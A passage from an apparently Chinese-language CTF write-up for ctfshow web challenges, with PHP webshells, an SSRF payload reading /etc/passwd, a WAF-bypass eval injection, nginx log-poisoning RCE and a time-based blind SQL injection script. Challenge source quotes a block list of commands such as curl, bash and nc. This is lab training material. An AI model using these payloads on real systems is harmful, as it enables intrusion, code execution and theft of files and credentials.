class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// T</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$_=$$____;</span><br><span class="line">$___($_[_]);<span class="comment">// // ASSERT($_POST[_]);</span></span><br><span class="line"><span class="comment">//再post提交_=system("cat /flag");</span></span><br></pre></td></tr></table></figure><p>2.根据代码的意思，用${$<em>{7}.$</em>{8}.$<em>{12}.$</em>{19}}可以拼凑出$hint，这样就能顺利以base64的方式读取hhh.php文件了，解密得到是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">"/phpjiami.zip\n/hint.php"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>下载压缩包，解密源码，得到一句话</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ch = explode(<span class="string">"."</span>,<span class="string">"hello.ass.world.er.rt.e.saucerman"</span>);</span><br><span class="line">$c = $ch[<span class="number">1</span>].$ch[<span class="number">5</span>].$ch[<span class="number">4</span>]; </span><br><span class="line">@$c($_POST[<span class="number">7</span><span class="number">-1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>POST</p><p><strong>6=system(‘cat /flag’);</strong>就可以拿到flag</p><img src="/2020/05/05/ctfshow/%E4%BD%A0%E6%8B%BF%E5%90%A7.png" class="" title="examplename"><h4 id="0X02：RemoteImageDownloader"><a href="#0X02：RemoteImageDownloader" class="headerlink" title="0X02：RemoteImageDownloader"></a>0X02：RemoteImageDownloader</h4><p>打开题目，给了一个http？？？？，可能是ssrf注入，测试一下发现下载了一张截图图片</p><p>vps监听</p><img src="/2020/05/05/ctfshow/RemoteImageDownloader.png" class="" title="examplename"><p>根据提示，去找资料，有文章<a href="https://www.anquanke.com/post/id/86371，里面有poc" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86371，里面有poc</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="actionscript"> x=<span class="keyword">new</span> XMLHttpRequest; </span></span><br><span class="line"><span class="actionscript"> x.onload=<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123; </span></span><br><span class="line"><span class="javascript"> <span class="built_in">document</span>.write(<span class="keyword">this</span>.responseText) </span></span><br><span class="line"> &#125;; </span><br><span class="line"><span class="actionscript"> x.open(<span class="string">"GET"</span>,<span class="string">"file:///etc/passwd"</span>); </span></span><br><span class="line"> x.send(); </span><br><span class="line"> <span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在自己的vpsweb服务目录下起个网页，再把目标改为flag</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heaed</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">x = <span class="keyword">new</span> XMLHttpRequest;</span></span><br><span class="line"><span class="actionscript">x.onload=<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.write(<span class="keyword">this</span>.responseText)</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="actionscript">x.open(<span class="string">"GET"</span>,<span class="string">"file:///flag"</span>);</span></span><br><span class="line">x.send();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在网页直接读取下载这个文件，成功拿到flag</p><img src="/2020/05/05/ctfshow/RemoteImageDownloader1.png" class="" title="examplename"><h4 id="0X03：给你shell"><a href="#0X03：给你shell" class="headerlink" title="0X03：给你shell"></a>0X03：给你shell</h4><p>在网页源码处找到了跳转页面，跳转</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">?php</span><br><span class="line"><span class="comment">//It's no need to use scanner. Of course if you want, but u will find nothing.</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'view_source'</span>])) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkCookie</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    $arr = explode(<span class="string">':'</span>, $s);</span><br><span class="line">    <span class="keyword">if</span> ($arr[<span class="number">0</span>] === <span class="string">'&#123;"secret"'</span> &amp;&amp; preg_match(<span class="string">'/^[\"0-9A-Z]*&#125;$/'</span>, $arr[<span class="number">1</span>]) &amp;&amp; count($arr) === <span class="number">2</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !theFirstTimeSetCookie() ) setcookie(<span class="string">'secret'</span>, <span class="string">''</span>, time()<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">haveFun</span><span class="params">($_f_g)</span> </span>&#123;</span><br><span class="line">    $_g_r = <span class="number">32</span>;</span><br><span class="line">    $_m_u = md5($_f_g);</span><br><span class="line">    $_h_p = strtoupper($_m_u);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $_g_r; $i++) &#123;</span><br><span class="line">        $_i = substr($_h_p, $i, <span class="number">1</span>);</span><br><span class="line">        $_i = ord($_i);</span><br><span class="line">        print_r($_i &amp; <span class="number">0xC0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>($_COOKIE[<span class="string">'secret'</span>]) ? $json = $_COOKIE[<span class="string">'secret'</span>] : setcookie(<span class="string">'secret'</span>, <span class="string">'&#123;"secret":"'</span> . strtoupper(md5(<span class="string">'y1ng'</span>)) . <span class="string">'"&#125;'</span>, time()+<span class="number">7200</span> );</span><br><span class="line">checkCookie($json) ? $obj = @json_decode($json, <span class="keyword">true</span>) : <span class="keyword">die</span>(<span class="string">'no'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($obj &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'give_me_shell'</span>])) &#123;</span><br><span class="line">    ($obj[<span class="string">'secret'</span>] != $flag_md5 ) ? haveFun($flag) : <span class="keyword">echo</span> <span class="string">"here is your webshell: $shell_path"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">die</span>;</span><br></pre></td></tr></table></figure><p>逻辑：</p><ul><li>cookie，存的是json</li><li>checkCookie()函数检测json数据只有一对键值对</li><li>secret!=$flag_md5，调用havefun函数，否则就输出shell地址</li></ul><p>经过测试，数字&amp;0xC0都为0，字母&amp;0xC0都是64，flag的MD5值为327a6c4304ad5938eaf0efb6cc3e53dc，刚好是000打头，弱类型直接上burp爆破</p><img src="/2020/05/05/ctfshow/shell1.png" class="" title="examplename"><p>根据提示，到下一步</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//there are some secret waf that you will never know, fuzz me if you can</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">"hidden_filter.php"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$_SESSION[<span class="string">'login'</span>])</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'&lt;script&gt;location.href=\'./index.php\'&lt;/script&gt;'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>])) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match($secret_waf, $code)) &#123;</span><br><span class="line">        <span class="comment">//清空session 从头再来</span></span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">"\$_SESSION["</span> . $code . <span class="string">"]=false;"</span>); <span class="comment">//you know, here is your webshell, an eval() without any disabled_function. However, eval() for $_SESSION only XDDD you noob hacker</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">'hacker'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面就是看Ying师傅的wp做了，fuzz黑名单过滤了一下东西</p><ul><li>f、sys、include</li><li>括号、引号、分号</li><li>^ &amp;等运算符</li><li>空格 / \ $ ` * #等符号</li></ul><p>这里带括号的函数，空格，分号都不能使用，命令拼接也无效</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;]&#x3D;1?&gt;&lt;?&#x3D;require~%d0%99%93%9e%98%d1%8b%87%8b?&gt;</span><br><span class="line">&#x2F;&#x2F;用?&gt;&lt;?来bypass分号</span><br><span class="line">&#x2F;&#x2F;PHP黑魔法 require和取反运算符之间不需要空格照样执行</span><br><span class="line">&#x2F;&#x2F;没有括号 使用那些不需要括号的函数 这里使用require</span><br><span class="line">&#x2F;&#x2F;]&#x3D;1来闭合session</span><br></pre></td></tr></table></figure><img src="/2020/05/05/ctfshow/shell2.png" class="" title="examplename"><p>拿到flag</p><h4 id="0X04：WEB-ALL-INFO-U-WANT"><a href="#0X04：WEB-ALL-INFO-U-WANT" class="headerlink" title="0X04：WEB_ALL_INFO_U_WANT"></a>0X04：WEB_ALL_INFO_U_WANT</h4><img src="/2020/05/05/ctfshow/want1.png" class="" title="examplename"><p>看到提示，用扫描器扫到index.php.bak,下载文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">visit all_info_u_want.php and you will get all information you want</span><br><span class="line">&#x3D; &#x3D;Thinking that it may be difficult, i decided to show you the source code:</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">&#x2F;&#x2F;give you all information you want</span><br><span class="line">if (isset($_GET[&#39;all_info_i_want&#39;])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br><span class="line">if (isset($_GET[&#39;file&#39;])) &#123;</span><br><span class="line">    $file &#x3D; &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;&quot; . $_GET[&#39;file&#39;];</span><br><span class="line">    &#x2F;&#x2F;really baby include</span><br><span class="line">    include($file);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">really really really baby challenge right?</span><br></pre></td></tr></table></figure><p>http回包header得知是nginx</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">all_info_u_want.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</span><br><span class="line">&#x2F;&#x2F;在user-agent处写入一句话木马即可包含RCE</span><br></pre></td></tr></table></figure><h4 id="0X05：WEB-Login-Only-For-36D"><a href="#0X05：WEB-Login-Only-For-36D" class="headerlink" title="0X05：WEB_Login_Only_For_36D"></a>0X05：WEB_Login_Only_For_36D</h4><p>打开是个注入题，常规手段fuzz一下，发现过滤了一下东西</p><ul><li>单引号</li><li>select substr等很多关键字</li><li>= &gt; &lt;</li><li>空格 – ; |等符号</li></ul><p>发现源码有提示</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- if (!preg_match('/admin/', $uname)) die; --&gt;</span><br><span class="line">&lt;!-- select * from 36d_user where username='$uname' and password='$passwd'; --&gt;</span><br></pre></td></tr></table></figure><p>用<code>admin\</code>把单引号注释掉让后面<code>$passwd</code>逃逸出去</p><p>布尔盲注无回显，用时间盲注，上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ord2hex</span><span class="params">(string)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        result += hex(ord(i))</span><br><span class="line"></span><br><span class="line">    result = result.replace(<span class="string">'0x'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'0x'</span> + result</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">url = <span class="string">"https://dc695489-cf68-45f2-97f9-1a21f62ba9e3.chall.ctf.show/"</span></span><br><span class="line">string = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">'IABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string:</span><br><span class="line">        password = ord2hex(res + chr(j))</span><br><span class="line">        password = <span class="string">'or/**/if((password/**/REGEXP/**/binary/**/&#123;&#125;),sleep(10),1)#'</span>.format(password)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>: <span class="string">"admin\\"</span>,</span><br><span class="line">            <span class="string">'password'</span>: password</span><br><span class="line">        &#125;</span><br><span class="line">        startTime = time.time()</span><br><span class="line">        r = req.post(url=url, data=data)</span><br><span class="line">        endtime = time.time()</span><br><span class="line">        <span class="keyword">if</span> endtime - startTime &gt; <span class="number">5</span>:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>跑出来密码是ILoVeThlrtySixD，跑了好几次才跑出来正确的</p><h4 id="0X06-WUSTCTF-朴实无华Revenge"><a href="#0X06-WUSTCTF-朴实无华Revenge" class="headerlink" title="0X06:WUSTCTF__朴实无华Revenge"></a>0X06:WUSTCTF__朴实无华Revenge</h4><p>题目直接给了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isPalindrome</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $len=strlen($str);</span><br><span class="line">    $l=<span class="number">1</span>;</span><br><span class="line">    $k=intval($len/<span class="number">2</span>)+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>($j=<span class="number">0</span>;$j&lt;$k;$j++)</span><br><span class="line">        <span class="keyword">if</span> (substr($str,$j,<span class="number">1</span>)!=substr($str,$len-$j<span class="number">-1</span>,<span class="number">1</span>)) &#123;</span><br><span class="line">            $l=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span> ($l==<span class="number">1</span>) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    $numPositve = intval($num);</span><br><span class="line">    $numReverse = intval(strrev($num));</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[^0-9.]/'</span>, $num)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"非洲欢迎你1"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (preg_match_all(<span class="string">"/\./"</span>, $num) &gt; <span class="number">1</span>) || (preg_match_all(<span class="string">"/\-/"</span>, $num) &gt; <span class="number">1</span>) || (preg_match_all(<span class="string">"/\-/"</span>, $num)==<span class="number">1</span> &amp;&amp; !preg_match(<span class="string">'/^[-]/'</span>, $num))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"没有这样的数"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($num != $numPositve) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'最开始上题时候忘写了这个，导致这level 1变成了弱智，怪不得这么多人solve'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($numPositve &lt;= <span class="number">-999999999999999999</span> || $numPositve &gt;= <span class="number">999999999999999999</span>) &#123; <span class="comment">//在64位系统中 intval()的上限不是2147483647 省省吧</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"非洲欢迎你2"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( $numPositve === $numReverse &amp;&amp; !isPalindrome($num) )&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"金钱解决不了穷人的本质问题"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"去非洲吧"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'md5'</span>]))&#123;</span><br><span class="line">    $md5=$_GET[<span class="string">'md5'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($md5==md5(md5($md5)))</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"去非洲吧"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'get_flag'</span>]))&#123;</span><br><span class="line">    $get_flag = $_GET[<span class="string">'get_flag'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!strstr($get_flag,<span class="string">" "</span>))&#123;</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"cat"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"more"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"tail"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"less"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"head"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"tac"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"sort"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"nl"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"$"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"curl"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"bash"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"nc"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"php"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/['\*\"[?]/"</span>, $get_flag)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'非预期修复*2'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;"</span>;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"快到非洲了"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"去非洲吧"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第一层</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($num != $numPositve) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'最开始上题时候忘写了这个，导致这level 1变成了弱智，怪不得这么多人solve'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//传整数，但是正则过滤了.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( $numPositve === $numReverse &amp;&amp; !isPalindrome($num) )&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;"</span>;</span><br><span class="line"> <span class="comment">//判断是回文串又不是回文串</span></span><br><span class="line">    </span><br><span class="line">    $numPositve = intval($num);</span><br><span class="line"><span class="keyword">if</span> ($num != $numPositve) 